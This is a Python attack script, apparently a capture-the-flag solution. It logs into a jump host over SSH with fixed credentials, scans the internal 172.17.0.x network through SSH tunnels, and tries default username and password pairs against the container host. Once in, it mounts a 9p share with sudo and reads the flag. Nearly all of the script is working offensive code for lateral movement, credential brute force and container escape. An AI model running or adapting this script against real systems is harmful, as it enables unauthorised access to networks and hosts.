import paramiko
import socket
import time
import sys

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令并返回输出"""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

def connect_to_real_host():
    """连接到真正的宿主机 172.17.0.1"""
    # 创建到跳板机的连接
    jump_ssh = paramiko.SSHClient()
    jump_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jump_ssh.connect(HOST, PORT, USER, PASSWD)
    print("[*] 已连接到跳板机")
    
    jump_transport = jump_ssh.get_transport()
    
    # 连接到172.17.0.1:22 (真正的宿主机)
    target_host = '172.17.0.1'
    target_port = 22
    
    print(f"[*] 通过隧道连接到 {target_host}:{target_port} (真正的宿主机)...")
    
    # 尝试不同的凭据
    creds = [
        ('ctf', '123456'),
        ('root', '123456'),
        ('root', 'root'),
        ('ubuntu', '123456'),
        ('ubuntu', 'ubuntu'),
        ('user', '123456'),
        ('admin', '123456'),
    ]
    
    for user, passwd in creds:
        try:
            print(f"[*] 尝试 {user}:{passwd}...")
            channel = jump_transport.open_channel("direct-tcpip", 
                                                  (target_host, target_port), 
                                                  ('127.0.0.1', 0), timeout=10)
            
            target_ssh = paramiko.SSHClient()
            target_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            target_ssh.connect(target_host, username=user, password=passwd, 
                             sock=channel, timeout=10, allow_agent=False, look_for_keys=False)
            
            print(f"[+] 成功以 {user}:{passwd} 登录到宿主机!")
            
            print("\n[*] 执行id:")
            print(exec_cmd(target_ssh, "id"))
            
            print("\n[*] 查看根目录:")
            print(exec_cmd(target_ssh, "ls -la /"))
            
            print("\n[*] 查看/mnt目录:")
            print(exec_cmd(target_ssh, "ls -la /mnt"))
            
            print("\n[*] 尝试mount flag:")
            result = exec_cmd(target_ssh, "sudo mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt")
            print(result)
            
            print("\n[*] 查看/mnt内容:")
            print(exec_cmd(target_ssh, "ls -la /mnt"))
            
            print("\n[*] 读取flag:")
            print(exec_cmd(target_ssh, "cat /mnt/flag"))
            print(exec_cmd(target_ssh, "cat /mnt/*"))
            
            target_ssh.close()
            jump_ssh.close()
            return True
        except paramiko.AuthenticationException as e:
            print(f"[-] 认证失败: {e}")
        except Exception as e:
            print(f"[-] 错误: {e}")
    
    jump_ssh.close()
    return False

def scan_172_network():
    """扫描172.17.0.x网络"""
    jump_ssh = paramiko.SSHClient()
    jump_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jump_ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = jump_ssh.get_transport()
    
    print("[*] 扫描172.17.0.x网络...")
    for i in range(1, 20):
        host = f"172.17.0.{i}"
        for port in [22, 80, 8080, 2222]:
            try:
                channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=1)
                print(f"[+] {host}:{port} 开放")
                channel.settimeout(1)
                try:
                    banner = channel.recv(100)
                    print(f"    Banner: {banner[:80]}")
                except:
                    pass
                channel.close()
            except:
                pass
    
    jump_ssh.close()

if __name__ == "__main__":
    print("="*50)
    print("[*] 连接真正的宿主机")
    print("="*50)
    
    print("\n[1] 扫描172网络")
    scan_172_network()
    
    print("\n[2] 尝试连接宿主机")
    connect_to_real_host()
